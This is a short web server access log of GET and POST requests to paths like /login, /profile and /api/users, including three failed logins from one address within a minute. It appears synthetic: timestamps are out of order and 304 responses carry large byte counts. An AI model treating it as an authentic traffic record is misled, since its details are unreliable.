198.51.100.77 - - [26/Mar/2026:13:02:30 +0900] "POST /login HTTP/1.1" 401 356 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.10 - - [26/Mar/2026:13:15:25 +0900] "GET /health HTTP/1.1" 304 9607 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.10 - - [26/Mar/2026:14:48:17 +0900] "GET /index.html HTTP/1.1" 200 10499 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.10 - - [26/Mar/2026:12:38:07 +0900] "POST /dashboard HTTP/1.1" 200 17232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:14:12:20 +0900] "POST /about HTTP/1.1" 200 44696 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.51 - - [26/Mar/2026:11:39:49 +0900] "POST /login HTTP/1.1" 200 41586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:10:06:00 +0900] "POST /profile HTTP/1.1" 304 5437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:11:16:32 +0900] "GET /images/logo.png HTTP/1.1" 200 3537 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:10:41:30 +0900] "POST /login HTTP/1.1" 200 24771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.11 - - [26/Mar/2026:13:45:26 +0900] "POST /login HTTP/1.1" 200 1802 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.11 - - [26/Mar/2026:09:15:24 +0900] "GET /about HTTP/1.1" 200 41079 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:14:34:43 +0900] "POST /login HTTP/1.1" 200 39752 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:11:16:51 +0900] "GET /contact HTTP/1.1" 200 40549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:12:28:56 +0900] "GET /images/logo.png HTTP/1.1" 200 1620 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.10 - - [26/Mar/2026:13:37:57 +0900] "POST /api/status HTTP/1.1" 200 42670 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.2.100 - - [26/Mar/2026:14:58:27 +0900] "GET / HTTP/1.1" 200 10935 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:14:38:07 +0900] "GET /css/style.css HTTP/1.1" 200 18229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
10.0.1.51 - - [26/Mar/2026:09:08:08 +0900] "POST /profile HTTP/1.1" 200 27332 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:03:04 +0900] "POST /login HTTP/1.1" 401 294 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.51 - - [26/Mar/2026:12:56:22 +0900] "GET /health HTTP/1.1" 200 14684 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:10:22:13 +0900] "GET / HTTP/1.1" 200 29314 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.11 - - [26/Mar/2026:13:44:01 +0900] "GET /api/users HTTP/1.1" 200 33075 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.50 - - [26/Mar/2026:13:58:34 +0900] "POST /contact HTTP/1.1" 200 45581 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
192.168.1.10 - - [26/Mar/2026:11:23:52 +0900] "GET /api/status HTTP/1.1" 301 3356 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
10.0.1.50 - - [26/Mar/2026:11:22:40 +0900] "GET /profile HTTP/1.1" 304 42526 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.2.100 - - [26/Mar/2026:12:20:41 +0900] "GET /images/logo.png HTTP/1.1" 200 37615 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
10.0.1.52 - - [26/Mar/2026:12:56:48 +0900] "GET /css/style.css HTTP/1.1" 200 33598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
198.51.100.77 - - [26/Mar/2026:13:02:42 +0900] "POST /login HTTP/1.1" 401 106 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
192.168.1.12 - - [26/Mar/2026:10:52:19 +0900] "POST /health HTTP/1.1" 200 42734 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
